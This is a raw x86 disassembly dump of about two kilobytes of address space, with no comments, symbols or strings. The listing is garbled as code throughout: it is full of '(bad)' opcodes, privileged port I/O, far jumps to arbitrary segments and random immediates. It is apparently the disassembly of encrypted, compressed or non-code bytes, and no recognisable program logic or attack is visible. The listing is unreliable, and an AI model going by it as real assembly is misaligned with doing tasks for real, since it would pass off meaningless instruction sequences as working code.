  417470:	mov    ebp,0xce597009
  417475:	ja     0x417485
  417477:	mov    DWORD PTR [eax],esi
  417479:	dec    ebx
  41747a:	adc    ebx,eax
  41747c:	repnz aad 0x1d
  41747f:	lar    edx,WORD PTR [esi+0x22d5511e]
  417486:	nop
  417487:	out    dx,eax
  417488:	in     al,0x5c
  41748a:	jno    0x41748c
  41748c:	aas    
  41748d:	pop    es
  41748e:	cmp    ebx,DWORD PTR gs:[ebx-0x75]
  417492:	mov    al,ds:0x19cdb6d3
  417497:	inc    esp
  417498:	sbb    al,dl
  41749a:	xchg   ecx,eax
  41749b:	ins    DWORD PTR es:[edi],dx
  41749c:	(bad)  
  41749d:	leave  
  41749e:	in     al,dx
  41749f:	(bad)  
  4174a0:	fcmovu st,st(2)
  4174a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174a3:	popf   
  4174a4:	sti    
  4174a5:	push   esp
  4174a6:	jmp    0xc6f00c7e
  4174ab:	xor    al,0x16
  4174ad:	xor    ebx,ebx
  4174af:	cdq    
  4174b0:	ficomp DWORD PTR [esi]
  4174b2:	test   DWORD PTR [edi*1+0x6a611869],0xf93bf4d6
  4174bd:	pushf  
  4174be:	adc    BYTE PTR ds:0xfb326241,bl
  4174c4:	xchg   ebx,eax
  4174c5:	mov    ecx,0x79da8643
  4174ca:	sub    eax,0x30975338
  4174cf:	pop    edi
  4174d0:	xor    dh,BYTE PTR [edx-0x2ada9db5]
  4174d6:	outs   dx,BYTE PTR ds:[esi]
  4174d7:	int3   
  4174d8:	sub    DWORD PTR [ebx],ebp
  4174da:	cmp    edi,0xffffffef
  4174dd:	push   ds
  4174de:	jno    0x41748d
  4174e0:	jo     0x4174a5
  4174e2:	push   ecx
  4174e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174e4:	jns    0x41752b
  4174e6:	in     al,0xd3
  4174e8:	out    0x85,al
  4174ea:	popf   
  4174eb:	and    dl,al
  4174ed:	inc    ecx
  4174ee:	std    
  4174ef:	test   al,0xda
  4174f1:	inc    ebx
  4174f2:	push   cs
  4174f3:	in     al,0x9
  4174f5:	add    DWORD PTR [edi+0x37],ebx
  4174f8:	dec    esp
  4174f9:	shl    DWORD PTR [edi-0x41],cl
  4174fc:	pushf  
  4174fd:	in     eax,0x87
  4174ff:	dec    esi
  417500:	pop    edx
  417501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417502:	adc    DWORD PTR [ebp-0x35],edx
  417505:	shl    BYTE PTR [ebp+0x2e76bcb4],1
  41750b:	mov    BYTE PTR [edi-0x55],ch
  41750e:	xchg   esi,eax
  41750f:	pusha  
  417510:	push   ds
  417511:	(bad)  
  417512:	mov    ds:0xfd5931ff,eax
  417517:	addr16 jnp 0x41752b
  41751a:	jno    0x41754b
  41751c:	rol    DWORD PTR [ecx+0x66b63a58],1
  417522:	adc    al,0xc9
  417524:	jo     0x4174f6
  417526:	shl    BYTE PTR [esi+0x5a],0x6b
  41752a:	bound  eax,QWORD PTR ds:0x2f69e3b1
  417530:	repnz xchg edi,eax
  417532:	pop    ecx
  417533:	ds dec edx
  417535:	xchg   DWORD PTR [edx+0x61d66f77],ebp
  41753b:	stc    
  41753c:	loop   0x4174dd
  41753e:	scas   al,BYTE PTR es:[edi]
  41753f:	cld    
  417540:	pop    esi
  417541:	scas   eax,DWORD PTR es:[edi]
  417542:	jno    0x417598
  417544:	out    0xbb,eax
  417546:	mov    WORD PTR [edx-0x288a5e23],ss
  41754c:	data16 (bad) 
  41754e:	mov    ecx,0xe059bc80
  417553:	xor    edi,DWORD PTR [esi+eax*8]
  417556:	jno    0x417564
  417558:	mul    dh
  41755a:	pop    ebx
  41755b:	scas   eax,DWORD PTR es:[edi]
  41755c:	fld    TBYTE PTR [edx+0x6cb1d3cf]
  417562:	mov    bl,0x25
  417564:	xchg   ebp,eax
  417565:	repz mov esi,0x23ceda37
  41756b:	inc    esi
  41756c:	sti    
  41756d:	(bad)  [ecx]
  41756f:	pop    ecx
  417570:	mov    ebp,0xe5f00bd6
  417575:	ret    
  417576:	adc    al,BYTE PTR [esi]
  417578:	shl    BYTE PTR [ebp+0x1435c171],1
  41757e:	mov    ebp,0x2060b355
  417583:	aam    0x38
  417585:	into   
  417586:	push   edi
  417587:	cmp    DWORD PTR [esi+0x5b2973df],esi
  41758d:	dec    edx
  41758e:	arpl   WORD PTR [edi+0x6f],bx
  417591:	std    
  417592:	mov    edx,0xaf91eb3
  417597:	mov    esi,0xd7ea9a8c
  41759c:	pop    edx
  41759d:	jg     0x417543
  41759f:	fcomp  QWORD PTR [ebx-0x61a85561]
  4175a5:	out    0x12,eax
  4175a7:	mov    ch,0xc
  4175a9:	sbb    BYTE PTR [ecx-0x2c0853a8],dh
  4175af:	out    dx,al
  4175b0:	and    dl,dh
  4175b2:	add    BYTE PTR [edx],ah
  4175b4:	fstp   TBYTE PTR ds:0x378f41e0
  4175ba:	xor    eax,0xc1199f21
  4175bf:	push   ebx
  4175c0:	sub    ecx,ebp
  4175c2:	fadd   DWORD PTR [ebp-0x23c15feb]
  4175c8:	ficomp WORD PTR [eax+0x765a5e2e]
  4175ce:	retf   
  4175cf:	mov    ds:0xc0851583,al
  4175d4:	ficomp DWORD PTR [esp+ebx*8+0x509a950b]
  4175db:	data16 mov bh,0xd6
  4175de:	sub    bl,BYTE PTR [edx]
  4175e0:	ror    DWORD PTR [ebx+0x61c43b28],0x71
  4175e7:	popa   
  4175e8:	ds ds aas 
  4175eb:	mov    gs,WORD PTR [edx]
  4175ed:	mov    bh,bl
  4175ef:	int3   
  4175f0:	dec    edi
  4175f1:	xchg   ebx,eax
  4175f2:	mov    bl,0x84
  4175f4:	inc    ebp
  4175f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175f6:	mov    cl,bl
  4175f8:	xor    eax,0x288b7102
  4175fd:	pop    edi
  4175fe:	dec    eax
  4175ff:	jnp    0x41764c
  417601:	sbb    DWORD PTR [ecx-0x17],edi
  417604:	and    DWORD PTR [ecx-0x3aa52149],ebx
  41760a:	pop    ss
  41760b:	pusha  
  41760c:	ja     0x4175b6
  41760e:	retf   
  41760f:	sbb    al,0xd9
  417611:	or     eax,0x959a5064
  417616:	cs adc eax,0x2e88d45a
  41761c:	test   al,0x46
  41761e:	loop   0x4175aa
  417620:	ficom  DWORD PTR [edi-0x680b5cc5]
  417626:	jmp    0x417686
  417628:	sbb    al,0xee
  41762a:	mov    edx,0xe9d6d361
  41762f:	xor    BYTE PTR [esi-0x5506e218],bl
  417635:	dec    esp
  417636:	jno    0x417683
  417638:	sbb    eax,0xe2144600
  41763d:	outs   dx,BYTE PTR ds:[esi]
  41763e:	mov    ecx,0x54ba4f1b
  417643:	lods   eax,DWORD PTR ds:[esi]
  417644:	adc    cl,0xa5
  417647:	push   ebx
  417648:	gs push esi
  41764a:	outs   dx,BYTE PTR ss:[esi]
  41764c:	mov    DWORD PTR [eax],edi
  41764e:	jno    0x4175d2
  417650:	jnp    0x4176ca
  417652:	jmp    0x4175f0
  417654:	mov    dl,0x22
  417656:	into   
  417657:	mov    ah,0xde
  417659:	xchg   esi,eax
  41765a:	jg     0x41762c
  41765c:	add    DWORD PTR [ebx],esp
  41765e:	inc    ecx
  41765f:	sub    bl,BYTE PTR [edx+0x1c]
  417662:	jae    0x41768f
  417664:	(bad)  
  417666:	iret   
  417667:	js     0x4176d3
  417669:	scas   eax,DWORD PTR es:[edi]
  41766a:	push   ds
  41766b:	and    al,0x7a
  41766d:	fisubr DWORD PTR [ecx-0x59708b2d]
  417673:	mov    DWORD PTR [ebx-0x2524c56b],0x41c22884
  41767d:	pop    esp
  41767e:	arpl   WORD PTR [esi],di
  417680:	sbb    bh,BYTE PTR [ecx-0x6c8e00b9]
  417686:	out    dx,eax
  417687:	push   ebx
  417688:	sbb    eax,0xaf06b124
  41768d:	pop    es
  41768e:	jno    0x4176af
  417690:	iret   
  417691:	adc    al,0x76
  417693:	jmp    0xb526:0xb6fe6696
  41769a:	and    al,0x52
  41769c:	das    
  41769d:	cld    
  41769e:	not    BYTE PTR [ebp+0x8a4535a]
  4176a4:	(bad)  
  4176a5:	shl    BYTE PTR [ecx+0x56],cl
  4176a8:	sahf   
  4176a9:	push   es
  4176aa:	loope  0x4176b7
  4176ac:	(bad)  
  4176ad:	cmp    BYTE PTR ds:0xbcd69f59,cl
  4176b3:	push   esi
  4176b4:	push   edi
  4176b5:	xor    DWORD PTR [edx+0x75],esi
  4176b8:	and    al,0x6c
  4176ba:	jno    0x4176a4
  4176bc:	xchg   esi,eax
  4176bd:	(bad)  
  4176be:	cli    
  4176bf:	mov    esi,0xd394394f
  4176c4:	jmp    0xe4bf5f72
  4176c9:	daa    
  4176ca:	add    DWORD PTR [edx+ebx*8],ebp
  4176cd:	cdq    
  4176ce:	(bad)  
  4176cf:	or     edx,DWORD PTR [esi]
  4176d1:	inc    esi
  4176d2:	ja     0x417711
  4176d4:	push   edi
  4176d5:	(bad)  
  4176d6:	pop    es
  4176d7:	test   al,0x68
  4176d9:	adc    ecx,DWORD PTR [eax+ebp*2-0x58]
  4176dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176de:	jno    0x4176e3
  4176e0:	fnsave [edi+ebp*2+0x22c21ff4]
  4176e7:	shl    DWORD PTR [ebx+0x4d],cl
  4176ea:	or     BYTE PTR [eax],dl
  4176ec:	dec    esi
  4176ed:	jne    0x417757
  4176ef:	push   esp
  4176f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176f1:	cmp    ch,BYTE PTR [edx-0x24e10b97]
  4176f7:	int3   
  4176f8:	enter  0x1341,0x3a
  4176fc:	vorps  ymm6,ymm7,YMMWORD PTR [ecx+0x557109e2]
  417704:	(bad)  
  417705:	repz arpl WORD PTR es:[eax-0xf2bfa23],bp
  41770d:	div    DWORD PTR [ebp+0x41]
  417710:	lahf   
  417711:	ret    0x8d1d
  417714:	xlat   BYTE PTR ds:[ebx]
  417715:	and    DWORD PTR [edi+0x44],0x244e92fa
  41771c:	pop    edi
  41771d:	inc    edx
  41771e:	aad    0xd3
  417720:	push   es
  417721:	adc    BYTE PTR [edi+0x6bb599d8],ah
  417727:	mov    dl,0xda
  417729:	cmp    BYTE PTR [edx-0x6c09ca3],cl
  41772f:	jle    0x4176bb
  417731:	(bad)  
  417732:	ret    0xfff1
  417735:	sar    DWORD PTR [edx+0x70de93a9],1
  41773b:	(bad)  
  41773c:	call   0xc13c:0x5deeccdd
  417743:	ror    DWORD PTR [ebx-0x1f],cl
  417746:	das    
  417747:	retf   0x19a8
  41774a:	(bad)  
  41774b:	nop
  41774c:	mov    ebp,0x1ad943a0
  417751:	push   esi
  417752:	jp     0x417776
  417754:	sub    ah,bl
  417756:	cwde   
  417757:	shl    DWORD PTR [ebx+0xc548f6],cl
  41775d:	jns    0x417746
  41775f:	jne    0x417738
  417761:	das    
  417762:	mov    dh,0xaf
  417764:	sbb    esp,DWORD PTR [esi+0x5797f39e]
  41776a:	aas    
  41776b:	out    0x53,al
  41776d:	(bad)  
  41776e:	dec    edi
  41776f:	push   cs
  417770:	aaa    
  417771:	mov    esp,0x8977d353
  417776:	jno    0x417764
  417778:	dec    ebp
  417779:	sbb    al,0xee
  41777b:	pop    esp
  41777c:	and    edi,DWORD PTR [esi-0x4f862be3]
  417782:	cmp    ebx,DWORD PTR [eax]
  417784:	loopne 0x417751
  417786:	scas   al,BYTE PTR es:[edi]
  417787:	repnz xlat BYTE PTR ds:[ebx]
  417789:	sub    eax,0x1fe1b66a
  41778e:	pop    esp
  41778f:	inc    esp
  417790:	es cmp esi,ebp
  417793:	ja     0x417807
  417795:	pop    ss
  417796:	ins    BYTE PTR es:[edi],dx
  417797:	enter  0x1a3,0xb9
  41779b:	push   eax
  41779c:	repnz fs loope 0x417784
  4177a0:	shl    DWORD PTR [ecx+esi*2+0x2a],cl
  4177a4:	mov    esp,0xb73a1d3f
  4177a9:	inc    ecx
  4177aa:	nop
  4177ab:	shr    edx,cl
  4177ad:	popf   
  4177ae:	jmp    0x41782d
  4177b0:	xchg   ebx,eax
  4177b1:	and    BYTE PTR [esp+ecx*8+0x49e215da],bh
  4177b8:	pusha  
  4177b9:	adc    al,0xcc
  4177bb:	push   0xffffffe6
  4177bd:	(bad)  
  4177be:	mov    ebx,cs
  4177c0:	adc    esi,DWORD PTR [ebx+edx*1-0x496a7b0a]
  4177c7:	fsub   QWORD PTR [ecx-0x2c]
  4177ca:	xchg   ebx,eax
  4177cb:	div    DWORD PTR [edi]
  4177cd:	addr16 push 0xffffffd5
  4177d0:	jle    0x4177aa
  4177d2:	repz out dx,eax
  4177d4:	retf   
  4177d5:	das    
  4177d6:	stc    
  4177d7:	xchg   edi,eax
  4177d8:	jp     0x4177a1
  4177da:	data16 cmp dh,cl
  4177dd:	(bad)  
  4177de:	test   BYTE PTR [eax-0x7f19043b],dh
  4177e4:	xchg   edi,eax
  4177e5:	sub    bh,cl
  4177e7:	sar    DWORD PTR [esi-0x2516f258],1
  4177ed:	or     al,0xae
  4177ef:	scas   eax,DWORD PTR es:[edi]
  4177f0:	xor    ch,dl
  4177f2:	clc    
  4177f3:	rcr    DWORD PTR [eax+0x3ad1056f],cl
  4177f9:	rol    BYTE PTR [edx-0x1d],cl
  4177fc:	fst    DWORD PTR [edx-0x42990726]
  417802:	mov    al,ds:0x19020250
  417807:	aam    0x48
  417809:	int    0x84
  41780b:	ja     0x4177c3
  41780d:	dec    eax
  41780e:	popa   
  41780f:	mov    ah,0xda
  417811:	xchg   edi,eax
  417812:	jne    0x41781f
  417814:	fistp  DWORD PTR [ecx-0x2938fd65]
  41781a:	pop    ebx
  41781b:	pop    esp
  41781c:	pushf  
  41781d:	mov    ch,0xd5
  41781f:	outs   dx,DWORD PTR ds:[esi]
  417820:	adc    DWORD PTR [esi+0x788ae36e],esi
  417826:	mov    WORD PTR [eax+0x75],?
  417829:	out    0x6e,al
  41782b:	retf   
  41782c:	out    dx,al
  41782d:	aad    0x74
  41782f:	mov    ds:0xb8a6567,al
  417834:	jle    0x4177fa
  417836:	stc    
  417837:	mov    ah,0xd7
  417839:	into   
  41783a:	cwde   
  41783b:	push   ds
  41783c:	clc    
  41783d:	je     0x417872
  41783f:	fdivr  QWORD PTR [ecx]
  417841:	mov    esp,0x90e8d3a1
  417846:	or     eax,0x458c8fa4
  41784b:	inc    edx
  41784c:	fisubr DWORD PTR [esi+0x38]
  41784f:	(bad)  
  417850:	std    
  417851:	rol    BYTE PTR [eax],cl
  417853:	mov    dl,0x2c
  417855:	mov    cl,dl
  417857:	add    al,0xda
  417859:	shr    esp,0x70
  41785c:	jbe    0x41781e
  41785e:	jbe    0x41786c
  417860:	fidivr DWORD PTR [ebx+0x31]
  417863:	js     0x4178d1
  417865:	or     al,0xe7
  417867:	push   edx
  417868:	dec    edi
  417869:	(bad)  
  41786a:	push   ebx
  41786b:	in     eax,0xc6
  41786d:	or     eax,ebp
  41786f:	mov    ecx,0x38711d8b
  417874:	mov    eax,0x9cc6c9bf
  417879:	xchg   ecx,eax
  41787a:	pushf  
  41787b:	shl    DWORD PTR ds:0x741beb18,cl
  417881:	in     eax,0x46
  417883:	add    dl,dh
  417885:	dec    ebp
  417886:	rcl    BYTE PTR [eax-0x130ed2bb],1
  41788c:	inc    esi
  41788d:	shl    eax,0xd3
  417890:	sbb    ebp,DWORD PTR [edi-0x1b08126]
  417896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417897:	add    edx,ebx
  417899:	nop
  41789a:	adc    esp,DWORD PTR [ebx+0x34dcbbae]
  4178a0:	pop    ebx
  4178a1:	call   0xbc1b:0xdd91b11
  4178a8:	cmc    
  4178a9:	mov    cl,0xfa
  4178ab:	jmp    0x417883
  4178ad:	ret    
  4178ae:	xchg   DWORD PTR [ebp+0x5a9f74d3],ebp
  4178b4:	aam    0xb5
  4178b6:	adc    DWORD PTR ds:0xc57eac17,edi
  4178bc:	out    dx,al
  4178bd:	mov    edi,0xe0d93336
  4178c2:	xor    al,0x8
  4178c4:	push   0xfffffffa
  4178c6:	add    BYTE PTR [esi],0xd9
  4178c9:	push   esp
  4178ca:	jmp    0x417886
  4178cc:	nop
  4178cd:	add    eax,0x1a7af025
  4178d2:	test   al,0x56
  4178d4:	adc    dh,dl
  4178d6:	cmc    
  4178d7:	jne    0x417907
  4178d9:	cdq    
  4178da:	(bad)  
  4178db:	push   esp
  4178dc:	xchg   esp,eax
  4178dd:	mov    DWORD PTR [ecx-0x5b],esi
  4178e0:	inc    ebx
  4178e1:	add    edi,esp
  4178e3:	sbb    bl,BYTE PTR [edi-0x712c1b03]
  4178e9:	inc    ebp
  4178ea:	lock xchg ecx,eax
  4178ec:	iret   
  4178ed:	addr16 ret 0xda5a
  4178f1:	or     eax,0xeb1f7a2b
  4178f6:	pop    esi
  4178f7:	inc    eax
  4178f8:	ss (bad) 
  4178fa:	adc    BYTE PTR [ecx+0x44],dh
  4178fd:	mov    BYTE PTR [esi+esi*4],ch
  417900:	mov    BYTE PTR [ebx+0xc815c71],ch
  417906:	push   0x50
  417908:	fmul   QWORD PTR [edi-0x4c3a2bde]
  41790e:	jp     0x417937
  417910:	sub    edx,DWORD PTR [ebx+0x1d70c6f]
  417916:	(bad)  
  417917:	ja     0x4178a2
  417919:	cmp    DWORD PTR [ecx],ebx
  41791b:	cmp    al,0x86
  41791d:	ret    0xd343
  417920:	ins    BYTE PTR es:[edi],dx
  417921:	lds    edi,FWORD PTR [esi*4-0x7f3aa21]
  417928:	test   dh,bl
  41792a:	jo     0x4178dd
  41792c:	loope  0x4178bd
  41792e:	ins    BYTE PTR es:[edi],dx
  41792f:	push   cs
  417930:	dec    ecx
  417931:	ins    BYTE PTR es:[edi],dx
  417932:	test   al,0xc5
  417934:	mov    ah,0xbd
  417936:	xchg   BYTE PTR [edx+ebx*2],cl
  417939:	add    ecx,DWORD PTR [edi+0x56]
  41793c:	popf   
  41793d:	sub    DWORD PTR [ecx+0x1268d7c9],ecx
  417943:	clc    
  417944:	dec    ebx
  417945:	pop    ds
  417946:	xor    eax,DWORD PTR [ebp+ebx*2-0x2d]
  41794a:	cmp    eax,esi
  41794c:	push   ebp
  41794d:	(bad)  
  41794e:	xor    al,0xf7
  417950:	popa   
  417951:	mov    eax,ds:0xb2e1ec68
  417956:	jno    0x41796a
  417958:	mov    ah,0xc7
  41795b:	mov    edx,DWORD PTR [edx-0x15]
  41795e:	pop    ebx
  41795f:	aam    0xd7
  417961:	mov    bh,0xc0
  417963:	mov    gs:0xdaed1329,al
  417969:	mov    edx,0x9a532c66
  41796e:	in     eax,dx
  41796f:	push   edi
  417970:	idiv   BYTE PTR [eax+0x1512a86d]
  417976:	sbb    eax,0xc37c773d
  41797b:	repz mov WORD PTR [eax+0x71],fs
  41797f:	lds    edx,FWORD PTR [esi]
  417981:	mov    ecx,0x30e14b9e
  417986:	jmp    0x41795b
  417988:	add    edx,esp
  41798a:	je     0x4179a2
  41798c:	adc    edi,DWORD PTR [esi]
  41798e:	setnp  bh
  417991:	inc    esp
  417992:	mov    edi,0x8ad6985b
  417997:	xor    DWORD PTR [esi-0x1e27d220],0xffffffc7
  41799e:	or     bh,BYTE PTR [edi]
  4179a0:	pop    eax
  4179a1:	loop   0x4179f3
  4179a3:	inc    ebp
  4179a4:	adc    DWORD PTR [ecx-0x77],edi
  4179a7:	ins    DWORD PTR es:[edi],dx
  4179a8:	fcmovbe st,st(7)
  4179aa:	xchg   BYTE PTR ds:0xe2cb8cb6,bh
  4179b0:	mov    edx,esi
  4179b2:	out    dx,al
  4179b3:	jl     0x4179b3
  4179b5:	sbb    cl,BYTE PTR [edi+esi*2]
  4179b8:	iret   
  4179b9:	pushf  
  4179ba:	outs   dx,BYTE PTR ds:[esi]
  4179bb:	jmp    DWORD PTR [edi+ebp*4+0x1df46b25]
  4179c2:	mov    bl,0xb5
  4179c4:	or     dl,dh
  4179c6:	push   esi
  4179c7:	ins    BYTE PTR es:[edi],dx
  4179c8:	adc    ebp,0x2e
  4179cb:	push   0x656de925
  4179d0:	lods   eax,DWORD PTR ds:[esi]
  4179d1:	xlat   BYTE PTR ds:[ebx]
  4179d2:	mov    ch,0x31
  4179d4:	loop   0x4179ab
  4179d6:	mov    ebp,0x14a686c7
  4179db:	inc    ebx
  4179dc:	jmp    0x1faeb0d
  4179e1:	mov    esp,0x8f1d30a0
  4179e6:	leave  
  4179e7:	int3   
  4179e8:	or     edi,DWORD PTR [edi+0x66]
  4179eb:	or     ebx,DWORD PTR [edi]
  4179ed:	xchg   BYTE PTR [edi+0x714b6d0d],dl
  4179f3:	fmul   QWORD PTR [edx+0x750f5941]
  4179f9:	mov    dh,dh
  4179fb:	int3   
  4179fc:	pop    eax
  4179fd:	ret    
  4179fe:	mov    dh,0xc7
  417a00:	and    edi,DWORD PTR [edi]
  417a02:	pop    ds
  417a03:	and    al,0x3b
  417a05:	xor    eax,edi
  417a07:	push   edi
  417a08:	call   0x8c19eb15
  417a0d:	add    eax,DWORD PTR [ebx]
  417a0f:	stos   DWORD PTR es:[edi],eax
  417a10:	mov    ?,esp
  417a12:	inc    esi
  417a13:	int    0x3c
  417a15:	mov    ds:0xd6407267,al
  417a1a:	cli    
  417a1b:	mov    ds:0x3e710a0c,al
  417a20:	and    eax,0xac77d4a
  417a25:	rol    BYTE PTR [ebp+eax*8-0x1401868d],1
  417a2c:	pop    edx
  417a2d:	mov    WORD PTR [edx-0x6c],cs
  417a30:	int3   
  417a31:	aas    
  417a32:	shl    DWORD PTR [edi],1
  417a34:	push   ss
  417a35:	les    esi,FWORD PTR [ecx+0x43]
  417a38:	adc    eax,0xa2093acb
  417a3d:	call   0x1e031034
  417a42:	jno    0x417ab6
  417a44:	adc    ah,al
  417a46:	or     cl,BYTE PTR [esi]
  417a48:	and    al,0x56
  417a4a:	dec    ebx
  417a4b:	add    BYTE PTR [ecx],0x11
  417a4e:	jno    0x4179d0
  417a50:	dec    edx
  417a51:	ins    DWORD PTR es:[edi],dx
  417a52:	mov    esi,0xd2d63010
  417a57:	inc    ecx
  417a58:	rcr    BYTE PTR [esi],cl
  417a5a:	adc    eax,0x712e56aa
  417a5f:	inc    eax
  417a60:	cwde   
  417a61:	xor    al,BYTE PTR [edi]
  417a63:	std    
  417a64:	not    DWORD PTR [edx]
  417a66:	call   ebx
  417a68:	int3   
  417a69:	jmp    0x417a39
  417a6b:	aaa    
  417a6c:	dec    ebp
  417a6d:	mov    ch,0xe5
  417a6f:	and    al,0xbc
  417a71:	jecxz  0x417a70
  417a73:	lods   al,BYTE PTR ds:[esi]
  417a74:	call   0xe091:0xbb4e75d8
  417a7b:	shl    DWORD PTR ds:0xe5ca7000,cl
  417a81:	pop    ds
  417a82:	mov    ds:0x9ac1daa3,eax
  417a87:	jmp    0xf9367434
  417a8c:	iret   
  417a8d:	fsub   st,st(5)
  417a8f:	sar    DWORD PTR [edx-0x5b],cl
  417a92:	aam    0x27
  417a94:	xchg   ecx,eax
  417a95:	outs   dx,BYTE PTR ds:[esi]
  417a96:	rcl    BYTE PTR ds:0xfd221fbd,cl
  417a9c:	jle    0x417af8
  417a9e:	jno    0x417adf
  417aa0:	and    ch,bl
  417aa2:	inc    esp
  417aa3:	pusha  
  417aa4:	pop    edi
  417aa5:	fcomp  QWORD PTR [edx]
  417aa7:	aam    0xed
  417aa9:	or     esp,DWORD PTR ds:0xe15d2c89
  417aaf:	mov    ah,0xe2
  417ab1:	test   BYTE PTR [ecx+0xc],dh
  417ab4:	pop    ecx
  417ab5:	mov    BYTE PTR [edx-0x6fe79d5f],bl
  417abb:	enter  0x43d3,0x91
  417abf:	in     al,dx
  417ac0:	fidiv  DWORD PTR [edi+0x77]
  417ac3:	dec    edi
  417ac4:	jns    0x417b0d
  417ac6:	inc    ebp
  417ac7:	jge    0x417b2e
  417ac9:	and    DWORD PTR [ecx+0x8],esi
  417acc:	outs   dx,DWORD PTR ds:[esi]
  417acd:	aaa    
  417ace:	int3   
  417acf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ad0:	sub    dh,dl
  417ad2:	inc    ecx
  417ad3:	inc    esi
  417ad4:	inc    esp
  417ad5:	(bad)  
  417ad6:	fdivr  DWORD PTR [esi-0x4b8f1d85]
  417adc:	or     esp,edx
  417ade:	lods   eax,DWORD PTR ds:[esi]
  417adf:	ja     0x417a87
  417ae1:	arpl   WORD PTR [ecx-0x2c],bp
  417ae4:	jmp    0xb6163224
  417ae9:	mov    ch,0xe0
  417aeb:	adc    cl,bl
  417aed:	shr    BYTE PTR [ebx+0x6b8bdcf5],0x6c
  417af4:	pop    edx
  417af5:	ds nop
  417af7:	fsubr  DWORD PTR [ebx-0x4a]
  417afa:	push   eax
  417afb:	mov    ebp,0xbe714da
  417b00:	xchg   esp,eax
  417b01:	push   ss
  417b02:	aad    0xd5
  417b04:	xor    eax,0x5af0c59c
  417b09:	idiv   bh
  417b0b:	xchg   ebx,eax
  417b0c:	dec    ebx
  417b0d:	aam    0xb2
  417b0f:	or     edx,ebx
  417b11:	sti    
  417b12:	stc    
  417b13:	test   al,0xde
  417b15:	sbb    WORD PTR [ebx-0x1daa2952],0xffbb
  417b1d:	and    al,0x58
  417b1f:	mov    dh,0xb5
  417b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b22:	jno    0x417ba3
  417b24:	mov    ebp,0x3b9066e3
  417b29:	shr    BYTE PTR [edx-0x64],cl
  417b2c:	cdq    
  417b2d:	cdq    
  417b2e:	push   0x1e
  417b30:	adc    al,0x19
  417b32:	cmp    edx,esp
  417b34:	mov    edx,0xda258fbe
  417b39:	es adc eax,0x959d3f61
  417b3f:	lods   al,BYTE PTR ds:[esi]
  417b40:	adc    eax,0x815cb7d6
  417b45:	ds xor dh,0x4c
  417b49:	sub    al,0x71
  417b4b:	pop    ebx
  417b4c:	hlt    
  417b4d:	imul   ebp,DWORD PTR [eax-0x6b25f576],0xdd59d2d3
  417b57:	sub    al,0x0
  417b59:	adc    ebx,DWORD PTR [eax]
  417b5b:	push   ecx
  417b5c:	xlat   BYTE PTR ds:[ebx]
  417b5d:	mov    edx,0x24649e2c
  417b62:	fisttp DWORD PTR [ebx]
  417b64:	ja     0x417b49
  417b66:	adc    eax,0x54cb46d4
  417b6b:	retf   0x5520
  417b6e:	fidivr DWORD PTR [edx]
  417b70:	fisubr DWORD PTR [ebp-0x78]
  417b73:	push   ss
  417b74:	jle    0x417b61
  417b76:	or     eax,0x48d5fdc7
  417b7b:	dec    esp
  417b7c:	pop    edi
  417b7d:	inc    ebp
  417b7e:	daa    
  417b7f:	mov    WORD PTR [esi-0x3bfa8f04],es
  417b85:	and    al,0xbb
  417b87:	stos   DWORD PTR es:[edi],eax
  417b88:	jecxz  0x417b20
  417b8a:	int3   
  417b8b:	ror    edx,cl
  417b8d:	test   BYTE PTR [ebx-0x471b0619],0xb4
  417b94:	mov    ebp,0xda465146
  417b99:	js     0x417b49
  417b9b:	ss daa 
  417b9d:	inc    ecx
  417b9e:	dec    ecx
  417b9f:	call   0x3834e5a
  417ba4:	icebp  
  417ba5:	pop    ss
  417ba6:	mov    ds:0x6b143353,eax
  417bab:	out    0xd9,al
  417bad:	add    bl,dh
  417baf:	scas   al,BYTE PTR es:[edi]
  417bb0:	retf   0xfcd5
  417bb3:	in     al,dx
  417bb4:	jmp    0x8157:0x4cd38e25
  417bbb:	xchg   ecx,eax
  417bbc:	ret    
  417bbd:	lea    ecx,[eax+0x44]
  417bc0:	fidivr DWORD PTR [ebx]
  417bc2:	and    DWORD PTR [esi],esp
  417bc4:	js     0x417bbd
  417bc6:	jnp    0x417b79
  417bc8:	jo     0x417c2b
  417bca:	dec    esi
  417bcb:	call   0xec6e:0x19f0dc4e
  417bd2:	and    cl,BYTE PTR [ecx+ebp*1]
  417bd5:	les    ebp,FWORD PTR [edx+0x3e]
  417bd8:	push   ebp
  417bd9:	ins    DWORD PTR es:[edi],dx
  417bda:	out    0xab,al
  417bdc:	pop    edx
  417bdd:	or     al,0x6e
  417bdf:	mov    ah,BYTE PTR [edx]
  417be1:	(bad)  
  417be2:	sub    al,0xe0
  417be4:	test   eax,ebx
  417be6:	or     ecx,DWORD PTR [ebp-0x40]
  417be9:	jmp    0x6de7:0xe0935170
  417bf0:	mov    cl,ah
  417bf2:	adc    bl,0xe0
  417bf5:	xor    eax,0x62f99de3
  417bfa:	addr16 ds pop ebp
  417bfd:	xchg   esi,eax
  417bfe:	xor    al,0xab
  417c00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c01:	xor    ah,BYTE PTR [edi]
  417c03:	pop    eax
  417c04:	fnstenv [edi+0x3]
  417c07:	jae    0x417c1e
  417c09:	xchg   esp,eax
  417c0a:	jne    0x417be8
  417c0c:	mov    ebp,0xe8772ed6
  417c11:	jno    0x417bed
  417c13:	out    0xc,eax
  417c15:	cmp    DWORD PTR [ecx+0x31],esi
  417c18:	pop    ss
  417c19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c1a:	ror    esi,0x3f
  417c1d:	pand   mm0,mm5
  417c20:	cmc    
  417c21:	mov    ds:0x469aab54,al
  417c26:	mov    bl,0x29
  417c28:	or     BYTE PTR [ecx],ch
  417c2a:	jno    0x417c09
  417c2c:	in     al,0xab
  417c2e:	cmp    BYTE PTR [eax-0x2bb96ddc],ch
  417c34:	sub    dh,bl
  417c36:	sub    edi,eax
  417c38:	retf   0xde9a
  417c3b:	sbb    edx,0x4d71b2e7
  417c41:	jnp    0x417c01
  417c43:	imul   esp,eax,0x59afd39d
  417c49:	pop    edx
